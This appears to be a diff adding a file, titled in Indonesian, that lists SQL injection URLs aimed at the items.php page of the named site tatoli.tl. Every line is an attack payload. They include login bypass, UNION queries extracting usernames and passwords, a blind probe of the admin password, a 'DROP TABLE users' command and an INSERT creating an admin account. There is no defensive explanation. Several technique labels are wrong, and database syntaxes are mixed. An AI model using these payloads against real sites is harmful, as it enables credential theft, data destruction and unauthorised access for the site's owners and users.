@@ -1,0 +1,38 @@
+-- Pengujian Kerentanan SQL Injection pada https://www.tatoli.tl
+
+**Basic Authentication Bypass**:
+   http://www.tatoli.tl/items.php?id=1' OR '1'='1' -- 
+
+**Union-Based Injection**:
+   http://www.tatoli.tl/items.php?id=1' UNION SELECT username, password FROM users -- 
+
+**Error-Based Injection**:
+   http://www.tatoli.tl/items.php?id=1' AND 1=CONVERT(int, (SELECT @@version)) -- 
+
+**Blind SQL Injection**:
+   http://www.tatoli.tl/items.php?id=1' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' -- 
+
+**Time-Based Blind SQL Injection**:
+   http://www.tatoli.tl/items.php?id=1; WAITFOR DELAY '00:00:10' -- 
+
+**Second-Order SQL Injection**:
+   http://www.tatoli.tl/items.php?id=1'; DROP TABLE users; -- 
+
+**Stacked Queries**:
+   http://www.tatoli.tl/items.php?id=1'; INSERT INTO users (username, password) VALUES ('admin', 'password'); -- 
+
+**Dynamic SQL Injection**:
+   http://www.tatoli.tl/items.php?id=1' UNION SELECT CONCAT(username, ':', password) FROM users -- 
+
+**Subquery Injection**:
+   http://www.tatoli.tl/items.php?id=1' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') -- 
+
+**Comment Injection**:
+    http://www.tatoli.tl/items.php?id=1' /* comment */ -- 
+
+**Additional Complex Payloads**:
+    http://www.tatoli.tl/items.php?id=1' UNION SELECT 1, 'test', 'test' -- 
+    http://www.tatoli.tl/items.php?id=1' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'database_name' -- 
+    http://www.tatoli.tl/items.php?id=1' AND (SELECT COUNT(*) FROM users) > 0 -- 
+    http://www.tatoli.tl/items.php?id=1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) -- 
+    http://www.tatoli.tl/items.php?id=1' OR IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0) -- 
